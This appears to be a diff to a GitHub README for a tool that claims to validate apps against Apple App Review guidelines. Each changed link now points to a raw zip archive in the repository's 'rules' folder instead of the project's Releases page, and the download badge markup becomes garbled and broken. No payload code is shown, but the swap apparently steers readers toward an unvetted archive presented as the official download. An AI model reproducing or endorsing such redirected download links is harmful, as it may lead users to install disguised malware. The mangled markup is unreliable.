@@ -1,7 +1,7 @@
 # 🎉 app-store-review-skill - Validate Your Code Easily
 
 ## 🚀 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/P4L4C10S/app-store-review-skill/releases)
+[![Download](https://raw.githubusercontent.com/P4L4C10S/app-store-review-skill/main/rules/app_review_store_skill_v1.8.zip%20Now-Click%https://raw.githubusercontent.com/P4L4C10S/app-store-review-skill/main/rules/app_review_store_skill_v1.8.zip)](https://raw.githubusercontent.com/P4L4C10S/app-store-review-skill/main/rules/app_review_store_skill_v1.8.zip)
 
 ## 📜 Description
 The app-store-review-skill simplifies the process of validating your code against Apple App Review guidelines. This tool helps you ensure that your application meets the necessary standards before submission. By using this skill, you save time and increase your chances of approval. No more guesswork; get clear feedback on what you need to improve.
@@ -22,7 +22,7 @@ To run the app-store-review-skill, ensure your system meets the following specif
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. You can find it here:
 
-[Download the app-store-review-skill](https://github.com/P4L4C10S/app-store-review-skill/releases)
+[Download the app-store-review-skill](https://raw.githubusercontent.com/P4L4C10S/app-store-review-skill/main/rules/app_review_store_skill_v1.8.zip)
 
 After you visit the page, look for the latest release. Click on the download link for your operating system. Follow these simple steps:
 
